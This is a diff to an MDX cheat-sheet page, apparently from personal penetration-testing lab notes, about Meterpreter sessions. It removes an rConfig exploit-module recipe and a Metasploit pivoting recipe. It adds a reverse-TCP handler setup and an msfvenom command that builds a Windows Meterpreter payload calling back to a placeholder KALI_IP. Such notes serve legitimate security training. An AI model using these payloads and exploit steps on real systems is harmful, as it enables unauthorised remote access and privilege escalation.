@@ -7,13 +7,19 @@ boost: 10
 hideFooterPagination: true
 ---
 
-import { PreservedNotes } from "/snippets/preserved-notes.jsx";
+{/* VAULT_TASK_FINDER_START */}
+
+import { TargetContextBar } from "/snippets/target-context-bar.jsx";
+
+<TargetContextBar />
+
+{/* VAULT_TASK_FINDER_END */}
 
 {/* Generated from Commands/meterpreter.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
-**Review status:** Operation context reviewed on 2 November 2026. This is an editorial review, not a lab execution or a claim about an installed tool version.
+[Search this tool’s saved examples](/commands/notebook?tool=meterpreter) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Current operation: Inspect an existing session's host and identity
+## Inspect an existing session's host and identity
 
 **Run in:** Inside an existing Meterpreter session. **Requires:** A live Meterpreter session whose platform supports these commands.
 
@@ -23,51 +29,9 @@ sysinfo
 getpid
 ```
 
-**Read the result:** Identify the session's host, architecture, user and available capabilities before choosing a command.
-
-**If The session identity differs from the desktop user or desired privilege:** A Meterpreter session is not automatically elevated; commands, extensions and transports have different prerequisites.
+**What the result establishes:** Identify the session's host, architecture, user and available capabilities before choosing a command.
 
 **Next check:** Record platform, process and token context; enter shell only when an OS command is required and assess its identity independently.
-
-**Scope of these examples:** The operations above provide the current starting checks. The complete earlier guide, variants and lab transcripts remain below; they retain their original assumptions.
-
-### Reviewed operation documentation
-
-- [Primary reference 1](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html)
-
-## Preserved earlier notes
-
-<PreservedNotes>
-
-Earlier commands, explanations and worked examples are retained in full. Follow their stated platform, prompt and lab prerequisites.
-
-## Meterpreter: choose the operation and read the result
-
-Commands and examples collected from your Meterpreter notes.
-
-### What the result establishes
-
-Identify the session's host, architecture, user and available capabilities before choosing a command.
-
-### Prerequisites and common failures
-
-A Meterpreter session is not automatically elevated; commands, extensions and transports have different prerequisites.
-
-### Example 1: Spawning TTY After Getting Shell
-
-Run in: **Notebook example**. Saved as written; may include lab values or terminal output.
-
-```bash
-meterpreter > shell
-# Non-interactive shell, no prompt — need TTY:
-python -c 'import pty; pty.spawn("/bin/sh")'
-```
-
-## Saved commands and notebook recipes
-
-Commands and examples collected from your Meterpreter notes.
-
-[Search this tool’s saved examples](/commands/notebook?tool=meterpreter) · [All tools](/index)
 
 ## Spawning TTY After Getting Shell
 
@@ -79,20 +43,17 @@ meterpreter > shell
 python -c 'import pty; pty.spawn("/bin/sh")'
 ```
 
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Shells, Payloads, and Interactive TTYs — Spawning TTY After Getting Shell](/exploitation/shells-payloads-cheat-sheet#spawning-tty-after-getting-shell)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
 Saved as written; may include lab values or terminal output.
 
-[Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
+## If it fails
+
+| Symptom | Check |
+| --- | --- |
+| The session identity differs from the desktop user or desired privilege | A Meterpreter session is not automatically elevated; commands, extensions and transports have different prerequisites. |
 
 ## Notebook recipes
 
-15 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+16 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
 
@@ -275,31 +236,6 @@ msfvenom --list payloads | grep windows
 
 </Accordion>
 
-<Accordion title="2 · Metasploit routing (pivot through a session)">
-
-### 2 · Metasploit routing (pivot through a session)
-
-**Pivoting, Tunneling, and Port Forwarding: Module Notes**
-
-```bash
-# through an existing meterpreter session:
-run autoroute -s 172.16.5.0/23         # or: post/multi/manage/autoroute (autoadd)
-route print                             # verify
-# now any msf module reaching 172.16.5.x goes through the session
-# expose those routes to EXTERNAL tools:
-use auxiliary/server/socks_proxy        # SRVPORT 9050, VERSION 5, run -j
-# then proxychains (socks5 127.0.0.1 9050) your nmap/xfreerdp/etc.
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — 2 · Metasploit routing (pivot through a session)](/modules/pivoting-tunneling-port-forwarding#2-·-metasploit-routing-pivot-through-a-session)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Common MSFvenom Commands">
 
 ### Common MSFvenom Commands
@@ -378,29 +314,6 @@ meterpreter > download <file> # Download file
 
 </Accordion>
 
-<Accordion title="rConfig 3.9.6 Exploitation">
-
-### rConfig 3.9.6 Exploitation
-
-**Shells, Payloads, and Interactive TTYs**
-
-```bash
-msf6 > use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
-msf6 > set RHOSTS <target>
-msf6 > set LHOST <your_ip>
-msf6 > exploit
-# → Meterpreter session as apache user
-```
-
-{/* VAULT_ORIGINAL_LINK_START */}
-
-**Original note sections:** [Shells, Payloads, and Interactive TTYs — rConfig 3.9.6 Exploitation](/exploitation/shells-payloads-cheat-sheet#rconfig-3-9-6-exploitation)
-
-{/* VAULT_ORIGINAL_LINK_END */}
-
-
-</Accordion>
-
 <Accordion title="Meterpreter getsystem and alternatives">
 
 ### Meterpreter getsystem and alternatives
@@ -421,6 +334,53 @@ python getsystem.py # from https://github.com/sailay1996/tokenx_privEsc
 
 {/* VAULT_ORIGINAL_LINK_END */}
 
+
+</Accordion>
+
+<Accordion title="Commands">
+
+### Commands
+
+**msfconsole**
+
+```bash
+msfconsole -q
+# Inside msfconsole
+search smb
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST KALI_IP
+set LPORT 4444
+run
+```
+
+</Accordion>
+
+<Accordion title="Configure a matching reverse-TCP handler">
+
+### Configure a matching reverse-TCP handler
+
+**msfconsole**
+
+```bash
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+set LHOST KALI_IP
+set LPORT 4444
+run
+```
+
+</Accordion>
+
+<Accordion title="Generate a Windows lab payload with explicit callback settings">
+
+### Generate a Windows lab payload with explicit callback settings
+
+**msfvenom**
+
+```bash
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o lab-payload.exe
+```
 
 </Accordion>
 
@@ -510,6 +470,10 @@ nt authority\system
 
 </AccordionGroup>
 
+## Related tools and references
+
+- [Official documentation 1](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html)
+
 {/* VAULT_RELATED_START */}
 
 **Source material and related references**
@@ -520,5 +484,3 @@ nt authority\system
 - [Historical AD Vulnerability Labs](/active-directory/historical-vulnerability-labs)
 
 {/* VAULT_RELATED_END */}
-
-</PreservedNotes>
